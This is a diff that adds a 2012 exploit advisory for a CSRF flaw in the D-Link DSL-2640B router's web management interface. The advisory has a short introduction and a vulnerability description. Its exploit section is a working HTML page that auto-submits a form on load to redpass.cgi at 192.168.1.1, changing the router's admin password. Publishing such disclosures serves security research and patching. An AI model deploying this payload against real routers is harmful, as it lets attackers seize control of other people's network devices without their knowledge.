@@ -1,0 +1,40 @@
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title : D-Link DSL-2640B (ADSL Router) CSRF Vulnerability
+# Date          : 19-02-2012
+# Author        : Ivano Binetti (http://ivanobinetti.com)
+# Vendor site   : http://www.d-link.com
+# Version       : DSL-2640B 
+# Tested on     : Firmware Version: EU_4.00; Hardware Version: B2
++--------------------------------------------------------------------------------------------------------------------------------+
++------------------------------------------[Change Admin Account Password by Ivano Binetti]--------------------------------------------------+
+Summary
+
+1)Introduction
+2)Vulnerability Description
+3)Exploit
+
++---------------------------------------------------------------------------------------------------------------------------------+
+
+
+1)Introduction
+
+D-Link DSL-2640B is an ADSL Router using (also) a web management interface. 
+
+
+2)Vulnerability Description
+
+The D-Link DSL-2640B's web interface (listening on tcp/ip port 80) is prone to CSRF vulnerabilities which allows to change router 
+parameters and -among other things- to change default administrator("admin") password.
+
+3)Exploit 
+
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<H2>CSRF Exploit to change ADMIN password</H2>
+<form method="POST" name="form0" action="http://192.168.1.1:80/redpass.cgi?sysPassword=new_password&change=1">
+</form>
+</body>
+</html>
+
+
++----------------------------------------------------------------------------------------------------------------------------------+
